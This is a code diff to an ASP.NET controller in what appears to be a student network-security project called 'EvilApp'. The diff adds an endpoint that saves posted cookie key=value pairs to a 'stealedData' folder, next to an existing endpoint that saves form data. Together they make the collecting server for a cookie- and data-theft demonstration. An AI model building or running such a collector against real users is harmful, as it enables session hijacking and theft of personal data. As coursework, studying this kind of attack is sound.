@@ -14,12 +14,25 @@ namespace EvilApp.Controllers
 
 		[HttpPost]
 		[Route("saveToFile")]
-		public IActionResult SaveToFile( string data)
+		public IActionResult SaveToFile(string data)
 		{
 			// These examples assume a "D:\Projects\NetworkSecurityFinalProject\EvilApp\stealedData" folder on your machine.
 			var path = @"D:\Projects\NetworkSecurityFinalProject\EvilApp\stealedData\";
 
-			System.IO.File.WriteAllText(path + GetFileName(), Request.HasFormContentType ? string.Join('\n',Request.Form.Keys) : "");
+			System.IO.File.WriteAllText(path + GetFileName(), Request.HasFormContentType ? string.Join('\n', Request.Form.Keys) : "");
+
+			return Ok();
+		}
+
+		[HttpPost]
+		[Route("saveCookiesToFile")]
+		public IActionResult SaveCookiesToFile(string data)
+		{
+			// These examples assume a "D:\Projects\NetworkSecurityFinalProject\EvilApp\stealedData" folder on your machine.
+			var path = @"D:\Projects\NetworkSecurityFinalProject\EvilApp\stealedData\";
+
+			System.IO.File.WriteAllText(path + "cookie" + GetFileName(), Request.HasFormContentType
+				? string.Join('\n', Request.Form.Select(s => s.Key + "=" + s.Value)) : "");
 
 			return Ok();
 		}
@@ -29,5 +42,6 @@ namespace EvilApp.Controllers
 			var date = DateTime.Now;
 			return date.Year.ToString() + date.Month + date.Day + date.Hour + date.Minute + date.Second + date.Millisecond + ".txt";
 		}
+
 	}
 }
